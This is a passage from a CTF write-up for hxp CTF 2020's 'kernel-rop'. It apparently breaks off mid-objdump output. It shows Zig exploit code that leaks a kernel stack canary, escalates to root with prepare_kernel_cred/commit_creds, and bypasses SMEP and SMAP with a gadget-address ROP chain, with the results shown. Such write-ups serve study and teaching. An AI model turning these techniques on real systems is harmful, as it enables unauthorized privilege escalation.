<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://feyor.sh/writeups/kernel-rop/">Original</a>
    <h1>kernel-rop (hxp CTF 2020)</h1>
    
    <div id="readability-page-1" class="page"><div>
  <h2 id="description">Description</h2>
<blockquote>
<p>Security is difficult, and defenses should be always taken with a grain of salt.
Who would win?
A buffer overflow or The Hottest Linux Defenses?
Flag is in <code>/dev/sda</code>.</p>
</blockquote>
<h3 id="files">Files</h3>
<ul>
<li><a href="https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xzy">kernel-rop-bf9c106d45917343.tar.xz</a></li>
</ul>
<h2 id="solution">Solution</h2>
<p>We’re given the kernel image <code>vmlinuz</code> and the <code>initramfs.cpio.gz</code>; let’s see what we’re working with:</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>extract-vmlinux vmlinuz &gt; vmlinux
</span></span><span><span>file vmlinux</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many section (36140)</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span>mkdir -p initramfs; <span>cd</span> initramfs
</span></span><span><span>zcat ../initramfs.cpio.gz | cpio -id --quiet
</span></span><span><span>ls</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>bin
</span></span><span><span>etc
</span></span><span><span>hackme.ko
</span></span><span><span>init
</span></span><span><span>root
</span></span><span><span>sbin
</span></span><span><span>usr</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span>pwn checksec ./initramfs/hackme.ko 2&gt;&amp;<span>1</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>[*] &#39;./initramfs/hackme.ko&#39;
</span></span><span><span>    Arch:       amd64-64-little
</span></span><span><span>    RELRO:      No RELRO
</span></span><span><span>    Stack:      Canary found
</span></span><span><span>    NX:         NX enabled
</span></span><span><span>    PIE:        No PIE (0x0)
</span></span><span><span>    Stripped:   No
</span></span><span><span>    Debuginfo:  Yes</span></span></code></pre></div><p>Let’s load <code>hackme.ko</code> into IDA:</p>



<div><pre tabindex="0"><code data-lang="c"><span><span><span>ssize_t</span> <span>__fastcall</span> <span>hackme_read</span>(file <span>*</span>f, <span>char</span> <span>*</span>data, <span>size_t</span> size, <span>loff_t</span> <span>*</span>off)
</span></span><span><span>{
</span></span><span><span>  <span>unsigned</span> <span>__int64</span> v4; <span>// rdx
</span></span></span><span><span><span></span>  <span>unsigned</span> <span>__int64</span> v5; <span>// rbx
</span></span></span><span><span><span></span>  <span>bool</span> v6; <span>// zf
</span></span></span><span><span><span></span>  <span>ssize_t</span> result; <span>// rax
</span></span></span><span><span><span></span>  <span>int</span> tmp[<span>32</span>]; <span>// [rsp+0h] [rbp-A0h] BYREF
</span></span></span><span><span><span></span>  <span>unsigned</span> <span>__int64</span> v9; <span>// [rsp+80h] [rbp-20h]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>_fentry__</span>(f, data);
</span></span><span><span>  v5 <span>=</span> v4;
</span></span><span><span>  v9 <span>=</span> <span>__readgsqword</span>(<span>0x28u</span>);
</span></span><span><span>  <span>_memcpy</span>(hackme_buf, tmp);
</span></span><span><span>  <span>if</span> ( v5 <span>&gt;</span> <span>0x1000</span> )
</span></span><span><span>  {
</span></span><span><span>    <span>_warn_printk</span>(<span>&#34;Buffer overflow detected (%d &lt; %lu)!</span><span>\n</span><span>&#34;</span>, <span>4096</span>, v5);
</span></span><span><span>    <span>BUG</span>();
</span></span><span><span>  }
</span></span><span><span>  <span>_check_object_size</span>(hackme_buf, v5, <span>1LL</span>);
</span></span><span><span>  v6 <span>=</span> <span>copy_to_user</span>(data, hackme_buf, v5) <span>==</span> <span>0</span>;
</span></span><span><span>  result <span>=</span> <span>-</span><span>14LL</span>;
</span></span><span><span>  <span>if</span> ( v6 )
</span></span><span><span>    <span>return</span> v5;
</span></span><span><span>  <span>return</span> result;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>ssize_t</span> <span>__fastcall</span> <span>hackme_write</span>(file <span>*</span>f, <span>const</span> <span>char</span> <span>*</span>data, <span>size_t</span> size, <span>loff_t</span> <span>*</span>off)
</span></span><span><span>{
</span></span><span><span>  <span>unsigned</span> <span>__int64</span> v4; <span>// rdx
</span></span></span><span><span><span></span>  <span>ssize_t</span> v5; <span>// rbx
</span></span></span><span><span><span></span>  <span>int</span> tmp[<span>32</span>]; <span>// [rsp+0h] [rbp-A0h] BYREF
</span></span></span><span><span><span></span>  <span>unsigned</span> <span>__int64</span> v8; <span>// [rsp+80h] [rbp-20h]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>_fentry__</span>(f, data, size, off);
</span></span><span><span>  v5 <span>=</span> v4;
</span></span><span><span>  v8 <span>=</span> <span>__readgsqword</span>(<span>0x28u</span>);
</span></span><span><span>  <span>if</span> ( v4 <span>&gt;</span> <span>0x1000</span> )
</span></span><span><span>  {
</span></span><span><span>    <span>_warn_printk</span>(<span>&#34;Buffer overflow detected (%d &lt; %lu)!</span><span>\n</span><span>&#34;</span>, <span>4096LL</span>);
</span></span><span><span>    <span>BUG</span>();
</span></span><span><span>  }
</span></span><span><span>  <span>_check_object_size</span>(hackme_buf, v4, <span>0LL</span>);
</span></span><span><span>  <span>if</span> ( <span>copy_from_user</span>(hackme_buf, data, v5) )
</span></span><span><span>    <span>return</span> <span>-</span><span>14LL</span>;
</span></span><span><span>  <span>_memcpy</span>(tmp, hackme_buf, v5);
</span></span><span><span>  <span>return</span> v5;
</span></span><span><span>}</span></span></code></pre></div><p>Ok, a kernel module that will happily <code>read</code>​/​<code>write</code> in way more than it’s supposed to.</p>
<p>Let’s check that we do indeed smash the stack:</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>const</span> std <span>=</span> <span>@import</span>(<span>&#34;std&#34;</span>);
</span></span><span><span>
</span></span><span><span><span>pub</span> <span>fn</span> main() <span>!</span><span>void</span> {
</span></span><span><span>    <span>const</span> fd <span>=</span> <span>try</span> std.posix.open(<span>&#34;/dev/hackme&#34;</span>, .{ .ACCMODE <span>=</span> .RDWR }, <span>0o660</span>);
</span></span><span><span>    <span>defer</span> std.posix.close(fd);
</span></span><span><span>
</span></span><span><span>    <span>var</span> buf<span>:</span> [<span>40</span>]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>    <span>const</span> bytes_read <span>=</span> <span>try</span> std.posix.read(fd, <span>&amp;</span>buf);
</span></span><span><span>    std.debug.dumpHex(buf[<span>0</span>..bytes_read]);
</span></span><span><span>
</span></span><span><span>    _ <span>=</span> <span>try</span> std.posix.write(fd, <span>&#34;nil&#34;</span>);
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>00007ffd2da7aa00  20 80 5F 07 80 88 FF FF  E0 0F 00 00 00 00 00 00   ._.............
</span></span><span><span>00007ffd2da7aa10  00 E6 F6 3F FF 6D FB F3  10 68 CA 06 80 88 FF FF  ...?.m...h......
</span></span><span><span>00007ffd2da7a9f0  68 FE 1B 00 00 C9 FF FF                           h.......
</span></span><span><span>[    1.539980] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: hackme_write+0xae/0xc0 [hackme]
</span></span><span><span>[    1.540395] CPU: 0 PID: 112 Comm: exploit Tainted: G           O      5.9.0-rc6+ #10
</span></span><span><span>[    1.540600] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014
</span></span><span><span>[    1.540865] Call Trace:
</span></span><span><span>[    1.541476]  dump_stack+0x74/0x92
</span></span><span><span>[    1.541560]  panic+0xfe/0x2e3
</span></span><span><span>[    1.541641]  ? hackme_write+0xae/0xc0 [hackme]
</span></span><span><span>[    1.541704]  __stack_chk_fail+0x14/0x20
</span></span><span><span>[    1.541757]  hackme_write+0xae/0xc0 [hackme]
</span></span><span><span>[    1.541840]  ? ksys_write+0xa7/0xe0
</span></span><span><span>[    1.541910]  ? exit_to_user_mode_prepare+0x31/0x180
</span></span><span><span>[    1.541975]  ? __x64_sys_write+0x1a/0x20
</span></span><span><span>[    1.542036]  ? do_syscall_64+0x37/0x80
</span></span><span><span>[    1.542111]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
</span></span><span><span>[    1.542666] Kernel Offset: disabled
</span></span><span><span>[    1.542945] Rebooting in 1 seconds..</span></span></code></pre></div><p>Sanity check complete.</p>
<p>Now let’s leak that pesky stack canary!
According to IDA there’s nothing below <code>int tmp[32]</code> on the stack (besides the frame pointer), so the offset should be 4 * 32 + 8.</p>
<blockquote>
<p><strong>Pro tip:</strong>
You can debug kernel modules under GDB by adding the offset of a particular function or instruction to the base address of said module, which can be found in  <code>/proc/modules</code>.</p>
</blockquote>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>var</span> buf<span>:</span> [<span>4</span><span>*</span><span>32</span><span>+</span><span>8</span>]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>_ <span>=</span> <span>try</span> std.posix.read(fd, <span>&amp;</span>buf);
</span></span><span><span>std.mem.reverse(<span>u8</span>, buf[buf.len<span>-</span><span>8</span>..]);
</span></span><span><span>std.debug.print(<span>&#34;Stack canary is 0x{s}</span><span>\n</span><span>&#34;</span>, .{std.fmt.bytesToHex(buf[buf.len<span>-</span><span>8</span>..], .lower)});</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>Stack canary is 0x1c55bfc54ff0b200</span></span></code></pre></div><p>Let’s check if we can do a simple ret2win:</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>const</span> tmp_size <span>=</span> <span>@sizeOf</span>(<span>i32</span>) <span>*</span> <span>32</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> bigEndianify(<span>comptime</span> len<span>:</span> <span>usize</span>, buf<span>:</span> []<span>const</span> <span>u8</span>) [len]<span>u8</span> {
</span></span><span><span>    <span>var</span> bufLE<span>:</span> [len]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>    <span>inline</span> <span>for</span> (<span>0</span>..len) <span>|</span>i<span>|</span> bufLE[i] <span>=</span> buf[len<span>-</span><span>1</span><span>-</span>i];
</span></span><span><span>    <span>return</span> bufLE;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>var</span> __spinlock<span>:</span> <span>bool</span> <span>=</span> <span>false</span>;
</span></span><span><span><span>inline</span> <span>fn</span> spin() <span>void</span> {
</span></span><span><span>    <span>while</span> (<span>true</span>) <span>if</span> (__spinlock) <span>break</span>;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>fn</span> leakCanary(fd<span>:</span> std.posix.fd_t) <span>!</span><span>u64</span> {
</span></span><span><span>    <span>var</span> buf<span>:</span> [tmp_size <span>+</span> <span>8</span>]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>    _ <span>=</span> <span>try</span> std.posix.read(fd, <span>&amp;</span>buf);
</span></span><span><span>
</span></span><span><span>    <span>return</span> std.mem.bytesAsValue(<span>u64</span>, buf[tmp_size..]).<span>*</span>;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>fn</span> ret2win() <span>void</span> {
</span></span><span><span>    <span>// i don&#39;t understand why, but this doesn&#39;t work (for an unpriviledged shell)
</span></span></span><span><span><span></span>    <span>// std.debug.print(&#34;[INFO] You won!!\n&#34;, .{});
</span></span></span><span><span><span></span>    <span>// const argv = [_:null]?[*:0]const u8{&#34;/usr/bin/whoami&#34;};
</span></span></span><span><span><span></span>    <span>// switch (std.posix.execveZ(argv[0].?, argv[0..argv.len], &amp;[_:null]?[*:0]const u8{})) {
</span></span></span><span><span><span></span>    <span>//     else =&gt; unreachable,
</span></span></span><span><span><span></span>    <span>// }
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>asm</span> <span>volatile</span>(<span>&#34;int3; nop&#34;</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>fn</span> exploit(fd<span>:</span> std.posix.fd_t) <span>!</span><span>void</span> {
</span></span><span><span>    <span>const</span> ret <span>=</span> std.mem.asBytes(<span>&amp;</span><span>@intFromPtr</span>(<span>&amp;</span>ret2win));
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] Address of ret2win is 0x{s}</span><span>\n</span><span>&#34;</span>, .{std.fmt.bytesToHex(bigEndianify(<span>8</span>, <span>@constCast</span>(ret)), .lower)});
</span></span><span><span>
</span></span><span><span>    <span>const</span> canary <span>=</span> <span>try</span> leakCanary(fd);
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] Stack canary is 0x{s}</span><span>\n</span><span>&#34;</span>, .{std.fmt.bytesToHex(bigEndianify(<span>8</span>, <span>@constCast</span>(std.mem.asBytes(<span>&amp;</span>canary))), .lower)});
</span></span><span><span>
</span></span><span><span>    <span>const</span> payload <span>=</span>
</span></span><span><span>        <span>&amp;</span>[_]<span>u8</span>{<span>0</span>} <span>**</span> tmp_size <span>++</span>
</span></span><span><span>        std.mem.asBytes(<span>&amp;</span>canary) <span>++</span>
</span></span><span><span>        <span>&amp;</span>[_]<span>u8</span>{<span>0</span>} <span>**</span> (<span>8</span> <span>*</span> <span>3</span>) <span>++</span>
</span></span><span><span>        ret;
</span></span><span><span>
</span></span><span><span>    _ <span>=</span> <span>try</span> std.posix.write(fd, payload);
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>[INFO] Address of ret2win is 0x00000000010251b0
</span></span><span><span>[INFO] Stack canary is 0x5d0897751cd5fe00
</span></span><span><span>[    2.480911] int3: 0000 [#1] SMP NOPTI
</span></span><span><span>[    2.480961] CPU: 0 PID: 112 Comm: exploit Tainted: G           O      5.9.0-rc6+ #10
</span></span><span><span>[    2.480966] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014
</span></span><span><span>[    2.480968] RIP: 0010:0x10251b1
</span></span><span><span>[    2.480970] Code: Bad RIP value.
</span></span><span><span>[    2.481005] RSP: 0018:ffffc900001bfeb0 EFLAGS: 00000296
</span></span><span><span>[    2.481028] RAX: 00000000000000a8 RBX: 0000000000000000 RCX: 0000000000000000
</span></span><span><span>[    2.481031] RDX: 0000000000000008 RSI: ffffffffc00024e0 RDI: ffffc900001bfea8
</span></span><span><span>[    2.481034] RBP: 0000000000000000 R08: 00000000010251b0 R09: 00000000010251b0
</span></span><span><span>[    2.481037] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
</span></span><span><span>[    2.481039] R13: ffffc900001bfef0 R14: 00007ffe920c3488 R15: ffff8880060c8600
</span></span><span><span>[    2.481042] FS:  0000000000000000(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
</span></span><span><span>[    2.481045] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
</span></span><span><span>[    2.481048] CR2: 000000000101fe20 CR3: 0000000006164000 CR4: 00000000000006f0
</span></span><span><span>[    2.481050] Call Trace:
</span></span><span><span>[    2.481052]  ? ksys_write+0xa7/0xe0
</span></span><span><span>[    2.481054]  ? exit_to_user_mode_prepare+0x31/0x180
</span></span><span><span>[    2.481056]  ? __x64_sys_write+0x1a/0x20
</span></span><span><span>[    2.481058]  ? do_syscall_64+0x37/0x80
</span></span><span><span>[    2.481061]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
</span></span><span><span>[    2.481063] Modules linked in: hackme(O)
</span></span><span><span>[    2.485064] ---[ end trace 32df1ad37c4c8194 ]---
</span></span><span><span>[    2.485072] RIP: 0010:0x10251b1
</span></span><span><span>[    2.485075] Code: Bad RIP value.
</span></span><span><span>[    2.485078] RSP: 0018:ffffc900001bfeb0 EFLAGS: 00000296
</span></span><span><span>[    2.485091] RAX: 00000000000000a8 RBX: 0000000000000000 RCX: 0000000000000000
</span></span><span><span>[    2.485093] RDX: 0000000000000008 RSI: ffffffffc00024e0 RDI: ffffc900001bfea8
</span></span><span><span>[    2.485096] RBP: 0000000000000000 R08: 00000000010251b0 R09: 00000000010251b0
</span></span><span><span>[    2.485098] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
</span></span><span><span>[    2.485101] R13: ffffc900001bfef0 R14: 00007ffe920c3488 R15: ffff8880060c8600
</span></span><span><span>[    2.485103] FS:  0000000000000000(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
</span></span><span><span>[    2.485106] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
</span></span><span><span>[    2.485108] CR2: 000000000101fe20 CR3: 0000000006164000 CR4: 00000000000006f0
</span></span><span><span>[    2.485111] Kernel panic - not syncing: Fatal exception in interrupt
</span></span><span><span>[    2.485661] Kernel Offset: disabled</span></span></code></pre></div><p>Nice.</p>
<h3 id="ret2usr">ret2usr</h3>
<p>For priviledge escalation, we’ll create a new set of root credentials with <code>prepare_kernel_cred(NULL)</code> and overwrite the process’s existing cred struct with <code>commit_creds()</code>.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>cat /proc/kallsyms | grep -e <span>&#39;prepare_kernel_cred&#39;</span> -e <span>&#39;commit_creds&#39;</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>ffffffff814c6410 T commit_creds
</span></span><span><span>ffffffff814c67f0 T prepare_kernel_cred
</span></span><span><span>ffffffff81f87d90 r __ksymtab_commit_creds
</span></span><span><span>ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
</span></span><span><span>ffffffff81fa0972 r __kstrtab_commit_creds
</span></span><span><span>ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred
</span></span><span><span>ffffffff81fa4d42 r __kstrtabns_commit_creds
</span></span><span><span>ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred</span></span></code></pre></div><p>Additionally, we need to swap to userland before we pop a shell; this can be accomplished by saving the state of registers before interacting with the <code>hackme</code> driver, then calling <code>swapgs</code>​/​<code>iretq</code> to context switch back to userland.</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>export</span> <span>var</span> user_cs<span>:</span> <span>u64</span> <span>=</span> <span>0</span>;
</span></span><span><span><span>export</span> <span>var</span> user_ss<span>:</span> <span>u64</span> <span>=</span> <span>0</span>;
</span></span><span><span><span>export</span> <span>var</span> user_rsp<span>:</span> <span>u64</span> <span>=</span> <span>0</span>;
</span></span><span><span><span>export</span> <span>var</span> user_rflags<span>:</span> <span>u64</span> <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> saveState() callconv(.C) <span>void</span> {
</span></span><span><span>    <span>asm</span> <span>volatile</span> (
</span></span><span><span>      <span>\\.intel_syntax noprefix</span>
</span></span><span><span>      <span>\\mov user_cs, cs</span>
</span></span><span><span>      <span>\\mov user_ss, ss</span>
</span></span><span><span>	  <span>\\mov user_rsp, rsp</span>
</span></span><span><span>	  <span>\\pushf</span>
</span></span><span><span>	  <span>\\pop qword ptr user_rflags</span>
</span></span><span><span>      <span>\\.att_syntax</span>
</span></span><span><span>    );
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>fn</span> escalate() callconv(.C) <span>void</span> {
</span></span><span><span>    <span>asm</span> <span>volatile</span> (
</span></span><span><span>      <span>\\.intel_syntax noprefix</span>
</span></span><span><span>      <span>\\xor rdi, rdi</span>
</span></span><span><span>      <span>\\movabs rcx, 0xffffffff814c67f0</span>
</span></span><span><span>	  <span>\\call rcx</span>
</span></span><span><span>
</span></span><span><span>      <span>\\mov rdi, rax</span>
</span></span><span><span>	  <span>\\movabs rcx, 0xffffffff814c6410</span>
</span></span><span><span>	  <span>\\call rcx</span>
</span></span><span><span>
</span></span><span><span>      <span>\\swapgs</span>
</span></span><span><span>      <span>\\mov r15, user_ss</span>
</span></span><span><span>      <span>\\push r15</span>
</span></span><span><span>      <span>\\mov r15, user_rsp</span>
</span></span><span><span>      <span>\\push r15</span>
</span></span><span><span>      <span>\\mov r15, user_rflags</span>
</span></span><span><span>      <span>\\push r15</span>
</span></span><span><span>      <span>\\mov r15, user_cs</span>
</span></span><span><span>      <span>\\push r15</span>
</span></span><span><span>      <span>\\mov r15, user_rip</span>
</span></span><span><span>      <span>\\push r15</span>
</span></span><span><span>      <span>\\iretq</span>
</span></span><span><span>      <span>\\.att_syntax</span>
</span></span><span><span>   );
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x4876ab567c920000
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h3 id="smep">SMEP</h3>
<p><strong>Supervisor mode execution protection</strong> is kinda like the NX bit: when we’re in the kernel, userland pages are marked as non-executable.
So instead of just calling <code>ret2win</code> we have to use ROP to pop a shell.</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>ropr --range<span>=</span>0xffffffff81000000-0xffffffff81b00000 -R <span>&#39;^swapgs|^iretq|^pop rdi; ret|^mov rdi, rax; (mov|ret)&#39;</span> vmlinux</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>0xffffffff81005245: mov rdi, rax; mov rdx, [rsp+8]; mov rax, [rsp]; add rsp, 0x18; jmp rdi;
</span></span><span><span>0xffffffff8100a557: swapgs; rdgsbase rax; swapgs; pop rbp; ret;
</span></span><span><span>0xffffffff8100a590: swapgs; wrgsbase rdi; swapgs; pop rbp; ret;
</span></span><span><span>0xffffffff81200000: swapgs; sysretq;
</span></span><span><span>0xffffffff812016d1: swapgs; sysret;
</span></span><span><span>0xffffffff8140867f: mov rdi, rax; mov rdx, rcx; shl rdx, 6; add rdx, rcx; mov byte ptr [rax+rdx*4+0x104], 0; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff8146d4e4: swapgs; pop rbp; ret;
</span></span><span><span>0xffffffff815e8db8: pop rdi; ret 0x4100;
</span></span><span><span>0xffffffff81612872: mov rdi, rax; mov [rdx], r15; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff816bf203: mov rdi, rax; mov [rsi+0x140], rdi; pop rbp; ret;
</span></span><span><span>0xffffffff816df01e: mov rdi, rax; mov [r15+0x50], edx; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff8177020d: mov rdi, rax; mov rcx, [r10+0x148]; mov rdx, [r10+0x150]; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff817aaccb: mov rdi, rax; mov [r8+0x98], rsi; mov [rbp-0x78], rdx; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff818040d9: mov rdi, rax; mov rdx, [rdx+0x30]; mov r8, [rdx+0x40]; call qword ptr [0xffffffff82040220];
</span></span><span><span>0xffffffff818f8495: mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret;
</span></span><span><span>0xffffffff8196258d: pop rdi; ret 0;
</span></span><span><span>0xffffffff819c67c7: iretq;
</span></span><span><span>0xffffffff819c6839: iretq;
</span></span><span><span>0xffffffff819c68f6: iretq;
</span></span><span><span>0xffffffff819ce301: pop rdi; ret 0xffff;
</span></span><span><span>0xffffffff81a68c0d: pop rdi; ret;
</span></span><span><span>0xffffffff81a77188: pop rdi; ret 0xb8ff;
</span></span><span><span>0xffffffff81adf905: iretq;</span></span></code></pre></div><p>Through trial and error I determined that gadgets roughly past <code>0xffffffff81b00000</code> were in a non-executable segment, so I restricted the search to reflect that.</p>
<p>Also, trying to use an allocator (including <code>FixedBufferAllocator</code>) to assist in constructing the payload led to confusing protection fault bugs, so beware of that.</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>const</span> POP_RDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff8196258d</span>;
</span></span><span><span><span>const</span> MOV_RDI_RAX_POP_RBP<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff816bf203</span>;
</span></span><span><span><span>const</span> SWAPGS_POP_RBP<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff8146d4e4</span>;
</span></span><span><span><span>const</span> IRETQ<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff819c67c7</span>;
</span></span><span><span>
</span></span><span><span><span>const</span> PREPARE_KERNEL_CRED<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff814c67f0</span>;
</span></span><span><span><span>const</span> COMMIT_CREDS<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff814c6410</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> ropchain(writer<span>:</span> anytype) <span>!</span><span>void</span> {
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>[_]<span>u64</span>{
</span></span><span><span>        POP_RDI,
</span></span><span><span>        <span>0</span>,
</span></span><span><span>        PREPARE_KERNEL_CRED,
</span></span><span><span>        MOV_RDI_RAX_POP_RBP,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        COMMIT_CREDS,
</span></span><span><span>        SWAPGS_POP_RBP,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        IRETQ,
</span></span><span><span>        user_rip,
</span></span><span><span>        user_cs,
</span></span><span><span>        user_rflags,
</span></span><span><span>        user_rsp,
</span></span><span><span>        user_ss,
</span></span><span><span>    }));
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x9866a26a8b9ba300
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h4 id="smap">SMAP</h4>
<p>With supervisor mode access protection we can not only not execute code in userspace, but not even read or write to it.
Because our ROP chain is contained in kernelspace, we are able to escalate priviledges and context switch to userspace without reading from userland memory, so no issues here!</p>



<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x9a56f4945c848500
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><p>(<a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#pivoting-the-stack">One possible solve</a> that works under SMEP but not SMAP involves stack pivoting to a page in userspace.)</p>
<h3 id="kpti">KPTI</h3>
<p><strong>Kernel page-table isolation</strong> is a mitigation that results in different page tables being used when in user-mode or kernel-mode, and it was introduced to combat the Meltdown attack.</p>
<p>The previous exploit will not work because even though we context switch to userspace, we are still using kernel page tables and so <code>ret2win</code> is inaccessible.
So in addition to context switching to userland, we also need to swap page tables.</p>
<p>This can be accomplished by a <em>KPTI trampoline</em>, which is very similar to our context switching gadget except that it also modifies the <code>CR3</code> register to swap page tables.</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>cat /proc/kallsyms | grep -e <span>&#39;swapgs_restore_regs_and_return_to_usermode&#39;</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span>objdump --start-address<span>=</span>0xffffffff81200f26 --stop-address<span>=</span>0xffffffff81200f46 -S vmlinux
</span></span><span><span>objdump --start-address<span>=</span>0xffffffff81200f89 --stop-address<span>=</span>0xffffffff81200f97 -S vmlinux
</span></span><span><span>objdump --start-address<span>=</span>0xffffffff8146d4e0 --stop-address<span>=</span>0xffffffff8146d4e9 -S vmlinux
</span></span><span><span>objdump --start-address<span>=</span>0xffffffff81200f46 --stop-address<span>=</span>0xffffffff81200f4b -S vmlinux
</span></span><span><span>objdump --start-address<span>=</span>0xffffffff81201067 --stop-address<span>=</span>0xffffffff81201082 -S vmlinux
</span></span><span><span>objdump --start-address<span>=</span>0xffffffff81200fc7 --stop-address<span>=</span>0xffffffff81200fc9 -S vmlinux</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>
</span></span><span><span>vmlinux:	file format elf64-x86-64
</span></span><span><span>
</span></span><span><span>Disassembly of section .text:
</span></span><span><span>
</span></span><span><span>ffffffff81000000 &lt;_stext&gt;:
</span></span><span><span>ffffffff81200f26: 48 89 e7             	movq	%rsp, %rdi
</span></span><span><span>ffffffff81200f29: 65 48 8b 24 25 04 60 00 00   	movq	%gs:0x6004, %rsp
</span></span><span><span>ffffffff81200f32: ff 77 30             	pushq	0x30(%rdi)
</span></span><span><span>ffffffff81200f35: ff 77 28             	pushq	0x28(%rdi)
</span></span><span><span>ffffffff81200f38: ff 77 20             	pushq	0x20(%rdi)
</span></span><span><span>ffffffff81200f3b: ff 77 18             	pushq	0x18(%rdi)
</span></span><span><span>ffffffff81200f3e: ff 77 10             	pushq	0x10(%rdi)
</span></span><span><span>ffffffff81200f41: ff 37                	pushq	(%rdi)
</span></span><span><span>ffffffff81200f43: 50                   	pushq	%rax
</span></span><span><span>ffffffff81200f44: eb 43                	jmp	0xffffffff81200f89 &lt;_stext+0x200f89&gt;
</span></span><span><span>
</span></span><span><span>ffffffff81000000 &lt;_stext&gt;:
